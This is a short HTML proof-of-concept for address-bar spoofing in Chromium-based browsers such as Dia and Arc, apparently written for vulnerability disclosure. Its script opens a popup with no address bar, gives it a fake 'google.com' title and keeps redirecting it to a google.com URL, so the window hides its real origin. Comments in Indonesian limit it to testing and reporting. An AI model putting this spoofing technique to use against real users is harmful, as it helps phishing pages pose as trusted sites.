<!-- 06 - popup chromeless (location=no)   [address-bar spoofing | macOS: Dia/Arc macOS (chrome digambar app)]
     MEKANISME : meminta jendela tanpa bilah; kalau fork menghormatinya, tidak ada permukaan apa pun yang bisa membantah judul palsu.
     PREDIKAT  : jendela tampil TANPA indikator origin sama sekali (S0).
     AMAN      : engine memaksa origin tetap tampil (Chrome desktop memaksanya).
     ETIKA     : browser & mesin sendiri. Nol form, nol kredensial, nol fetch/beacon, nol resource luar.
                 "www.google.com" = label tak-berbahaya; example.com = origin uji (IANA reserved).
                 Berhenti di predikat -> screenshot -> lapor VRP. Bukan kit phishing. -->
<meta charset="utf-8"><title>06 popup chromeless (location=no)</title>
<button onclick="go()" style="font:16px system-ui;padding:12px 22px">RUN</button>
<p id="o" style="font:12px ui-monospace,monospace;color:#555"></p>
<script>
var T='https://www.google.com:9090/';o.textContent='REAL: '+location.origin;
function go(){var w=window.open('','','toolbar=no,location=no,menubar=no,status=no,width=420,height=560');w.document.write('<title>google.com</title><h3>tanpa bilah - ditulis '+location.origin+'</h3>');setInterval(function(){w.location.replace(T);},9800);}
</script>
